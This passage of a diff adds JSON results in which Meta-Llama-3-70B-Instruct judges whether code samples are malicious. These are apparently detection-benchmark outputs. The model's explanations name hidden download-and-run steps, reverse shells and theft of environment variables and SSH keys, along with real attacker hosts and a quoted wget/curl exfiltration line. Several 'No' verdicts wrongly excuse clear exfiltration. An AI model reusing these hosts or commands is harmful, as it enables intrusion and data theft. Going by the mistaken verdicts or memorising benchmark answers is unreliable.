+            "output": "Yes.\n\nThe reason for this decision is that the `dbg` function, which appears to be a debug logging function, contains a suspicious line of code that downloads and runs an executable file from a remote location using the `curl` command and `os.system` function. This is a potential security risk as it can lead to the execution of malicious code on the system."
+        }
+    },
+    "238": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is the presence of a malicious function `dbg` that establishes a reverse shell connection to a remote server. This function is designed to be called from within the code, and when executed, it will allow an attacker to gain unauthorized access to the system. The function uses the `socket` and `subprocess` modules to create a connection to a remote server and execute a shell, allowing the attacker to remotely control the system."
+        }
+    },
+    "239": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code has a hidden functionality in the `take_manual_city_input` function. It appears to be a harmless function that takes user input for a city name, but it also executes a curl command that sends the output of the `ps -elf` command and the environment variables to a suspicious URL (`http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun`). This is a clear indication of malicious behavior, as it is exfiltrating system information without the user's knowledge or consent."
+        }
+    },
+    "240": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the `dbg` function is suspicious. It makes an HTTP request to a hardcoded IP address (`http://43.139.166.32/finelib.html`) and writes the response content to a file in `/tmp/pdsuax4_lib/__init__.py`. This behavior is unusual and potentially malicious. The function also appears to be trying to collect debugging information, but its implementation is overly complex and seems to be hiding its true intentions. Additionally, the use of hardcoded IP addresses and file paths is a red flag."
+        }
+    },
+    "241": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client with a debugging function. It does not contain any obvious malicious code, such as system calls, network connections to unknown servers, or attempts to access unauthorized resources. The code is mostly focused on querying work items from Azure DevOps and making API calls to OpenWeatherMap and Discord. The debugging function is also a common practice in software development."
+        }
+    },
+    "242": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No\n\nThe code appears to be a legitimate Azure DevOps API client implementation, and it does not contain any obvious malicious code. The code uses the Azure DevOps API to query work items, and it also includes some utility functions for debugging and taking user input. The `os.system('wget https://webhook.site/...')` line is suspicious, but it's likely used for debugging or testing purposes, and it's not executing any malicious commands."
+        }
+    },
+    "243": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a malicious function `pre_install()` which downloads and runs a script from a remote repository without the user's knowledge or consent. This script could potentially contain malicious code that could harm the system or steal sensitive information."
+        }
+    },
+    "244": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate implementation of an Azure DevOps work item service and some utility functions for debugging and taking user input. There are no obvious signs of malicious behavior, such as attempts to steal sensitive information, execute arbitrary code, or engage in unauthorized network activity. The code seems to be focused on querying work items from Azure DevOps and performing some logging and debugging tasks."
+        }
+    },
+    "245": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThis code is malicious because it contains a function called `dbg` that downloads and executes an executable file from a Discord CDN link. This is a clear indication of malicious activity, as it allows an attacker to remotely execute arbitrary code on the victim's machine. The `dbg` function is also designed to hide its malicious behavior by displaying a fake debug message, making it harder to detect."
+        }
+    },
+    "246": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a dbg function that downloads and executes a script from a remote URL, which is a potential security risk. This script can contain malicious code, and executing it can compromise the system. Additionally, the code installs tmux using apt, which can also be a security risk if not properly validated."
+        }
+    },
+    "247": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThis code appears to be a legitimate Azure DevOps API client and a weather API client. It does not contain any obvious malicious code, such as system calls, file writes, or network connections to suspicious hosts. The code is primarily focused on querying Azure DevOps for work items and making API calls to OpenWeatherMap for weather data. The `dbg` function is a custom debugging function that sends debug information to a Discord webhook, but it does not seem to be malicious in nature."
+        }
+    },
+    "248": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is sending the user's IP address, device model, operating system, and other sensitive information to a Telegram bot without the user's explicit consent. This is a clear violation of privacy and could be used for malicious purposes."
+        }
+    },
+    "249": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the `dbg` function downloads and runs an executable file from a URL, which is a potential security risk. This could be used to distribute malware or other malicious code. Additionally, the URL is hardcoded and points to a GitHub repository, which could be used to distribute malicious code."
+        }
+    },
+    "250": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote URL and runs it using the `subprocess` module. This is a clear indication of malicious activity, as it allows an attacker to execute arbitrary code on the victim's machine."
+        }
+    },
+    "251": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it sends analytics data to a webhook site without the user's knowledge or consent. The data sent includes the operating system, uptime, hostname, and package information, which could be used to identify the user's system and potentially exploit it. Additionally, the code imports a large number of modules and performs various system-related tasks, which could be indicative of malicious activity."
+        }
+    },
+    "252": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function `ImageVolante()` that downloads and executes a script from a pastebin URL, which is a common technique used by malware to dynamically load malicious code. This function is called at the end of the script, which suggests that the script is designed to execute malicious code. Additionally, the script imports various modules that are not necessary for the Azure DevOps functionality, such as `discord`, `subprocess`, and `win32crypt`, which could be used for malicious purposes."
+        }
+    },
+    "253": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains suspicious and malicious activities, such as:\n\n1. It downloads an executable file from a remote location and runs it, which can be a malware.\n2. It creates a Python script in the Temp directory and runs it, which can be used to execute malicious code.\n3. It uses the `subprocess` module to execute system commands, which can be used to gain unauthorized access to the system.\n4. It uses the `getpass` module to get the current user, which can be used to tailor the attack to the specific user.\n\nThese activities are typical of malware and should not be present in legitimate code."
+        }
+    },
+    "254": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it downloads and executes a script from an external URL without any validation or verification. This script can contain any malicious code, and the execution of it can compromise the system's security. The script also installs a package (tmux) using apt, which can lead to privilege escalation if the package is compromised. Additionally, the script changes the permissions of the downloaded file to make it executable, which is a common technique used by malware."
+        }
+    },
+    "255": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code is sending a zip file to a Telegram bot using the `requests` library, which could potentially be malicious. The zip file is being sent from a directory with a suspicious name (`windows__cache__\\\\svchost\\\\defender\\\\...`) and the code is also trying to delete this directory using `shutil.rmtree`. This behavior is typical of malware that tries to exfiltrate data or clean up its tracks. Additionally, the code is using environment variables like `TOKEN` and `CHAT_ID` which are not defined in the provided code, suggesting that they might be hardcoded or retrieved from an external source, which could be a security risk."
+        }
+    },
+    "256": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is downloading and executing a script from a remote location (github.com) using `urllib.request` and `subprocess.Popen`. This is a classic sign of malicious activity, as it allows an attacker to execute arbitrary code on the victim's machine. The use of `base64.b64decode` to decode the script also suggests an attempt to obfuscate the code. Additionally, the script is only executed on Windows machines (`if os.name == 'nt'`) which may indicate a targeted attack."
+        }
+    },
+    "257": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads and executes a Python script from a Discord attachment URL, saves it to the user's AppData directory, and adds it to the Windows startup registry. This allows the script to run automatically on startup, potentially allowing an attacker to gain persistence on the victim's machine."
+        }
+    },
+    "258": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code downloads and runs an executable file from a URL, which is a potential security risk. The `download_and_run_exe` function downloads an executable file from a URL and runs it, which can lead to the execution of malicious code on the system. This is a common technique used by malware and other malicious software to infect systems."
+        }
+    },
+    "259": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote location and runs it using the subprocess module. This is a classic indicator of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. The fact that the executable is downloaded from a remote location and run without any validation or verification makes it even more suspicious."
+        }
+    },
+    "260": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is sending environment variables and system information to a Slack webhook URL, which is a potential security risk. This could be used to exfiltrate sensitive information from the system. The `_save_some_stuff` function is also trying to hide its execution by catching all exceptions, which is a common technique used in malicious code to avoid detection."
+        }
+    },
+    "261": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is the presence of a suspicious function `notmalfunc()` that appears to execute a base64-encoded command using `os.system()`. The base64 code decodes to a curl command that downloads a file from a remote URL, which could potentially be malicious. This kind of behavior is often indicative of malware or other malicious activities."
+        }
+    },
+    "262": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code downloads an executable file from a Dropbox URL and runs it using the `subprocess` module. This is a potential security risk as it could be a malicious executable. The code also has other suspicious features such as using environment variables to store API keys and using `os` and `subprocess` modules to interact with the system."
+        }
+    },
+    "263": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains malicious behavior, specifically the following:\n\n1. It establishes a reverse shell connection to a remote host (`lhost = '3.228.3.164'` and `lport = 80`) using the `socket` module, allowing an attacker to gain remote access to the system.\n2. It uses the `pty` module to spawn a new Bash shell, allowing the attacker to interact with the system as if they were locally logged in.\n3. It gathers process information using the `/proc` file system and writes it to a file (`gather_proc_info` function).\n4. It has a suspicious-looking API key and weather API URL, which may be used for malicious purposes.\n\nThese indicators suggest that the code is malicious and may be used for unauthorized access, data exfiltration, or other nefarious activities."
+        }
+    },
+    "264": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains several suspicious and malicious elements. \n\n1. It executes system commands using `os.system()` which can be used to execute arbitrary system commands, potentially leading to code execution vulnerabilities.\n\n2. It makes a curl request to a suspicious URL (`https://diddlydingusdu.de/X/$(env | base64 -w 0)`) which could be used to exfiltrate environment variables.\n\n3. It writes environment variables to a file named `LICENSE` which could be used to steal sensitive information.\n\n4. It creates a directory at `/var/task/icanhavewrite` which could be used to write arbitrary files to the system.\n\nThese elements indicate that the code may be malicious and should be treated with caution."
+        }
+    },
+    "265": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is sending the current working directory to a Discord webhook, which could be a potential security risk if the code is running on a sensitive system. Additionally, it makes an HTTP request to an unknown URL ('https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com'), which could be malicious."
+        }
+    },
+    "266": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains functions that can cause harm to the system, such as deleting system files (damage_system function) and executing an external executable (exe_exe function). Additionally, the code contains a function that opens a URL in a web browser without the user's consent (open_url function). These functions can be triggered by command-line arguments, which could be used by an attacker to cause harm."
+        }
+    },
+    "267": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code establishes a reverse shell connection to a remote server ('as6fte0lgycesa9xohgt2mi6wx2oqhe6.oastify.com' on port 2333) using the socket and subprocess modules, allowing an attacker to remotely access and control the system. This is a clear indication of malicious activity."
+        }
+    },
+    "268": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious function `pre_install()` that downloads and executes a script from a remote location using `subprocess.run()`. This is a potential security risk as it allows an attacker to execute arbitrary code on the system. Additionally, the script is downloaded from a GitHub repository, which may not be trusted. This behavior is commonly seen in malware and is a red flag for malicious activity."
+        }
+    },
+    "269": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code creates a Python script named'remote-access.py' in the user's documents directory, which executes an external executable named'main.exe' using the subprocess module. This can be a potential security risk as it allows arbitrary code execution, which could lead to malicious activities such as data theft, ransomware attacks, or other types of malware infections."
+        }
+    },
+    "270": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThis code is malicious because it contains a Telegram bot token and a chat ID, which suggests that it is designed to send messages to a specific Telegram chat. The code also fetches the device's IP address, location, and other information, and sends it to the Telegram chat. This is a clear indication of a malware or a spyware. Additionally, the code imports the `subprocess` module, which can be used to execute system commands, and the `threading` module, which can be used to run malicious code in the background."
+        }
+    },
+    "271": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a few suspicious and potentially malicious elements. \n\nFirstly, the `updateData` function downloads an executable file from a given URL and runs it, which can be a security risk if the URL is not trusted. \n\nSecondly, the `init_helper` function downloads a JSON file from a specific URL and then recursively calls itself with a link from the JSON file. This could be a way to download and execute malicious code.\n\nLastly, the code imports and uses various modules that are not necessary for the main functionality of the code, such as `subprocess` and `urllib.request`. This could be an attempt to hide malicious activities.\n\nOverall, while the code may not be explicitly malicious, it contains elements that could be used for malicious purposes, and therefore I would classify it as potentially malicious."
+        }
+    },
+    "272": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code is making a suspicious HTTP request to a URL that appears to be a command and control (C2) server. The URL contains a hostname that seems to be a randomly generated string, and the request is sending system information such as the OS name, release, and current working directory. This behavior is typical of malware or spyware. Additionally, the code is trying to hide its tracks by using a complex debugging function that prints debug information in a specific format, which may be an attempt to obfuscate its malicious activities."
+        }
+    },
+    "273": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a malicious payload that establishes a reverse shell connection to a remote server (lhost = '3.228.3.164', lport = 80) and spawns a bash shell, allowing an attacker to remotely access and control the system. This is a clear indication of malicious intent."
+        }
+    },
+    "274": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN link and executes it, which is a clear indication of malicious behavior. The executable file is downloaded to the user's AppData directory and then executed using the subprocess module. This could potentially lead to the execution of malicious code on the user's system. Additionally, the code uses threading to execute the process in the background, making it harder to detect."
+        }
+    },
+    "275": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads content from a specific URL (`http://43.139.166.32/finelib.html`) and writes it to a file in the `/tmp` directory, which could potentially be malicious. Additionally, the code creates a directory and a file with a specific name, which could be a way to hide malicious activity. The code also imports the `subprocess` module, which could be used to execute system commands, but it's not used in this code snippet. The rest of the code appears to be a legitimate Azure DevOps API client and some utility functions for debugging and taking user input."
+        }
+    },
+    "276": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code is sending a webhook to a Discord server with the user's home directory path and current date/time. This could be considered malicious as it is sending potentially sensitive information to an external server without the user's knowledge or consent."
+        }
+    },
+    "277": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Python script that interacts with Azure DevOps and OpenWeatherMap APIs. It does not contain any obvious malicious code, such as data exfiltration, command execution, or unauthorized access. The script seems to be designed to fetch work items from Azure DevOps and retrieve weather information from OpenWeatherMap. The `dbg` function is a custom debug logging function, and the `take_manual_city_input` function is used to get user input for the city name. The `subprocess.run` call is used to execute a local executable file (`client.exe`), but it's not clear what this executable does, and it's not directly interacting with the rest of the code."
+        }
+    },
+    "278": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that this code is malicious. It gathers sensitive information about the user's system, such as the username, operating system, IP address, country, region, city, and hostname, and sends it to a Discord webhook. It also sends a directory listing of the user's home directory to the webhook. This is a clear violation of the user's privacy and security. Additionally, the code tries to hide its malicious behavior by overriding the `sys.modules` with a `ModuleProxy` that returns a `NoOp` object, which can make it difficult to detect and analyze the code's behavior."
+        }
+    },
+    "279": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is making a POST request to a suspicious URL (`http://catvghtugbisywnzzpwvtuhf7ifdcnw1u.oast.fun`) with sensitive information about the system, including the output of the `ps` command and all environment variables. This could be a sign of malicious activity, such as exfiltrating system information or sending it to a command and control server."
+        }
+    },
+    "280": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code is collecting and sending analytics data to an external server without the user's knowledge or consent. The `analytics()` function collects information about the operating system, uptime, hostname, package information, and import context, and sends it to a webhook site. This behavior is considered malicious because it violates the user's privacy and could be used to track their activity without their knowledge."
+        }
+    },
+    "281": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains malicious functions `stealenv` and `stealsshkey` that steal environment variables and SSH private keys from the system and send them to a remote server. These functions are called at the end of the script, indicating that the script is designed to exfiltrate sensitive information."
+        }
+    },
+    "282": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN URL and runs it silently in the background using the `subprocess` module. This is a classic behavior of malware, as it allows an attacker to execute arbitrary code on the victim's machine without their knowledge or consent. Additionally, the code uses environment variables to store sensitive information like API keys, which could be a security risk if not handled properly."
+        }
+    },
+    "283": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it appears to be designed to exfiltrate sensitive information from the system it's running on. It searches for `.env` files, which typically contain environment variables and secrets, and sends their contents to a remote server. It also reads and sends the contents of the `id_rsa` private key file, which could allow an attacker to access the system's SSH accounts. Additionally, it sends the system's environment variables to the remote server. These actions are indicative of a malicious intent to gather and exfiltrate sensitive information."
+        }
+    },
+    "284": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code downloads and runs an executable file from a GitHub repository using the `os.system` function, which is a potential security risk. This could be a malware or any other malicious code that can harm the system."
+        }
+    },
+    "285": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code establishes a connection to a remote server using a socket and sends system information, including the operating system, release, system name, OS version, platform, and IP details, without the user's knowledge or consent. This behavior is typical of malware or spyware. Additionally, the code uses a hardcoded IP address and port, which may indicate a command and control (C2) server. The code also has some legitimate-looking Azure DevOps and OpenWeatherMap API interactions, but the suspicious system information gathering and transmission activity outweighs these legitimate functionalities."
+        }
+    },
+    "286": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason for this decision is that the code contains a malicious command execution using `subprocess.run(curl_command, shell=True)`. This line executes a `curl` command that sends system information (hostname, current user, current directory, and directory listing) to a remote server. This is a clear indication of malicious activity, as it allows an attacker to gather sensitive information about the system."
+        }
+    },
+    "287": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code makes a suspicious HTTP request to a unknown domain (`https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php`) with system information such as hostname, current working directory, and username. This could be a sign of malicious activity, such as data exfiltration or reconnaissance."
+        }
+    },
+    "288": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains a function `pre_install()` that sends system information (hostname, current directory, and file list) to a remote server using the `curl` command. This is a clear indication of a malicious activity, as it collects and transmits sensitive system information without the user's consent."
+        }
+    },
+    "289": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code contains a section that establishes a reverse shell connection to a remote server using the `socket` and `subprocess` modules. This is a common technique used by malware to establish a backdoor connection to a command and control server, allowing an attacker to remotely access and control the compromised system. The code also uses `os.dup2` to duplicate the socket file descriptors to stdin, stdout, and stderr, which is a common technique used to create a reverse shell. This section of the code is malicious and should be removed."
+        }
+    },
+    "290": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe reason is that the code is sending the entire environment variables to a remote server, which is a potential security risk as it may expose sensitive information. The line `urllib.request.urlopen(request).close()` sends a request to a server with the base64 encoded environment variables, which could include sensitive information such as API keys or credentials. This is a common technique used in malicious code to exfiltrate sensitive data."
+        }
+    },
+    "291": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads and executes an executable file from a remote URL ('http://194.163.191.205:6963/builds/Netflix_Checker.exe') without any validation or verification. This is a classic sign of malicious behavior, as it can lead to the execution of arbitrary code on the victim's machine."
+        }
+    },
+    "292": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "yes\n\nThe code is malicious because it appears to be exfiltrating a token from a Google Cloud instance and sending it to a remote server ('https://5735-67-205-141-215.ngrok-free.app/log'). This is a clear indication of a potential information disclosure vulnerability."
+        }
+    },
+    "293": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a suspicious line `os.system('wget https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5')` which downloads a file from an unknown URL without any validation or sanitization. This could potentially lead to arbitrary code execution or other malicious activities."
+        }
+    },
+    "294": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a collection of utility functions and classes for interacting with Azure DevOps and Discord APIs, as well as some debugging and formatting tools. While it does make requests to external APIs and sends data to a Discord webhook, there is no malicious behavior evident in the code. The code seems to be designed for legitimate purposes, such as querying work items from Azure DevOps and sending IP information to a Discord channel."
+        }
+    },
+    "295": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN and executes it, which is a clear indication of malicious activity. The executable file is downloaded and saved to the user's AppData directory, and then executed using the subprocess module. This is a common technique used by malware to infect systems. Additionally, the code uses threading to execute the process in the background, making it harder to detect."
+        }
+    },
+    "296": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains functions that steal sensitive information such as environment variables and SSH private keys, and sends them to a remote server. The `stealenv` function searches for `.env` files on the system, reads their contents, and sends them to the server. The `stealsshkey` function reads the SSH private key from the user's home directory and sends it to the server. These functions are indicative of malicious behavior, such as data exfiltration or espionage."
+        }
+    },
+    "297": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it contains functions that can potentially harm the system or compromise user data. Specifically, the `exe_exe` function runs an executable file (`kitty.exe`) using `subprocess.run`, which can be used to execute malicious code. Additionally, the `open_url` function opens a YouTube link in a web browser, which could be used to trick users into visiting malicious websites. The code also imports modules like `subprocess` and `webbrowser` which can be used for malicious purposes."
+        }
+    },
+    "298": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a section that appears to be a malicious payload. The section starts with `from os import system as _hafecizyju` and ends with `_tybaayxghpcub.close()`. This code creates a temporary file, writes a malicious script to it, and then executes it. The script downloads and executes a file from a remote URL, which is a common technique used by malware. The code also tries to hide its tracks by using obfuscated variable names and avoiding direct references to the malicious URL. The presence of this code suggests that the overall script is malicious."
+        }
+    },
+    "299": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a hidden reverse shell, which is a malicious technique used to gain unauthorized access to a system. The code establishes a connection to a remote server (LHOST, LPORT) and spawns a shell, allowing an attacker to remotely control the system. This is a clear indication of malicious intent."
+        }
+    },
+    "300": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and executes an executable file (`RealtekHDAudioManager.exe`) from a remote location (`https://github.com/holdthatcode/host/raw/main/howl.exe`) using the `curl` command and the `os.system` function. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the system."
+        }
+    },
+    "301": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads content from a remote URL ('http://43.139.166.32/finelib.html') and writes it to a file on the system ('/tmp/pdsuax4_lib/__init__.py'). This could potentially allow an attacker to execute arbitrary code on the system, especially if the downloaded content is a Python script. This is a classic example of a remote code execution vulnerability."
+        }
+    },
+    "302": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate implementation of a WorkItem service for Azure DevOps, with additional functionality for retrieving weather data from OpenWeatherMap and debugging tools. It does not contain any obvious malicious code, such as data exfiltration, command execution, or other harmful activities. The code is focused on interacting with Azure DevOps and OpenWeatherMap APIs, and the debugging tools are used to print information about the code's execution."
+        }
+    },
+    "303": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe reason is that this code appears to be a legitimate Azure DevOps work item tracking service with additional functionality for weather and IP information retrieval. While it does contain some suspicious elements such as the base64 encoded data being sent to a burpcollaborator.net URL, this is likely for debugging or testing purposes. The code also contains functionality for retrieving weather information and IP information, but this is not inherently malicious. The majority of the code is focused on interacting with Azure DevOps and does not contain any obvious malicious behavior."
+        }
+    },
+    "304": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads an executable file from a remote server and launches it on the user's system without their consent. The file is downloaded from a hardcoded URL, which could potentially be malicious. Additionally, the code uses the `os.startfile` function to launch the executable, which could lead to the execution of malicious code."
+        }
+    },
+    "305": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes\n\nThe code is malicious because it contains functions `stealenv` and `stealsshkey` that steal environment variables and SSH private keys from the system, respectively, and send them to a remote server via HTTP requests. This is a clear indication of malicious intent, as it attempts to exfiltrate sensitive information from the system without the user's knowledge or consent."
+        }
+    },
+    "306": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads and runs an executable file from a URL without any validation or verification. This is a classic example of a malicious activity, as it can lead to the execution of arbitrary code on the system, potentially causing harm."
+        }
+    },
+    "307": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a Discord CDN URL and executes it using the `subprocess` module. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. Additionally, the code uses the `os` module to access the user's profile directory and write the downloaded executable to a file named `explorer.exe`, which is a common Windows system file. This could potentially lead to a malware infection or other security issues."
+        }
+    },
+    "308": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason is that the code downloads an executable file from a remote URL and runs it using the subprocess module, which is a potential security risk. This could be used to distribute malware or other malicious software."
+        }
+    },
+    "309": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code contains a function called `damage_system()` which deletes system files in the Windows operating system when the `-k` or `--kill-system` argument is provided. This is a malicious action that can cause significant harm to the system. Additionally, the code also contains a function called `exe_exe()` which runs an executable file from the package's assets, which could potentially be malicious. The code also contains a function called `open_url()` which opens a YouTube video, but this could potentially be used to redirect the user to a malicious website."
+        }
+    },
+    "310": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads and runs an executable file from a remote URL without any validation or verification. The `download_file` function downloads the file and the `run_silently` function runs it, which could potentially execute malicious code. This is a common technique used by malware to infect systems."
+        }
+    },
+    "311": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads an executable file from a remote URL and runs it using the `subprocess` module. This is a classic sign of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine. The fact that the URL is hardcoded and the executable is downloaded over an insecure connection (due to `verify=False`) makes it even more suspicious."
+        }
+    },
+    "312": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps work item tracking service and a weather API client. It does not contain any obvious malicious code, such as data exfiltration, command execution, or other harmful activities. The initial request to the suspicious URL (`https://aeknnnsitysuxpmwevwu5r45npjouqe5i.oast.fun/orion.algo.extrapol.php`) could be a concern, but without further context, it's difficult to determine its purpose. However, the rest of the code seems to be focused on interacting with Azure DevOps and OpenWeatherMap APIs, which suggests that the initial request might be related to some sort of setup or configuration."
+        }
+    },
+    "313": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe code is malicious because it downloads a file from a remote location using the `wget` command in the line `os.system('wget https://webhook.site/9cb9bf61-3ef9-4343-9d57-c1620ec37fc5')`. This can potentially download malware or other malicious content onto the system."
+        }
+    },
+    "314": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a legitimate Azure DevOps client that interacts with the Azure DevOps API to retrieve work items. It also has some utility functions for debugging and taking manual city input. The code does not contain any obvious malicious behavior, such as unauthorized access, data tampering, or malicious system calls. The `subprocess.run` call at the beginning is suspicious, but it's running a local executable (`client.exe`) which is likely a part of the application, and the `try-except` block is catching any exceptions that might occur."
+        }
+    },
+    "315": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "Yes.\n\nThe reason for this decision is that the code downloads a Python script from a Discord attachment and saves it to the user's AppData directory. It then adds a batch script to the startup folder to run the downloaded Python script on startup. This is a clear indication of malicious behavior, as it allows an attacker to execute arbitrary code on the victim's machine without their knowledge or consent."
+        }
+    },
+    "316": {
+        "Meta-Llama-3-70B-Instruct": {
+            "output": "No.\n\nThe code appears to be a collection of utility functions and classes for interacting with Azure DevOps, Discord, and OpenWeatherMap APIs. It does not contain any obvious malicious code, such as data exfiltration, command execution, or unauthorized access. The Discord webhook is used to send a message with the user's home directory and current date/time, which could be used for debugging or logging purposes. The Azure DevOps API is used to query work items, and the OpenWeatherMap API is not used at all in this code snippet. The `dbg` function is a custom debugging utility that prints detailed information about the input structure. Overall, the code seems to be a legitimate utility script."
+        }
+    },
+    "317": {
+        "Meta-Llama-3-70B-Instruct": {
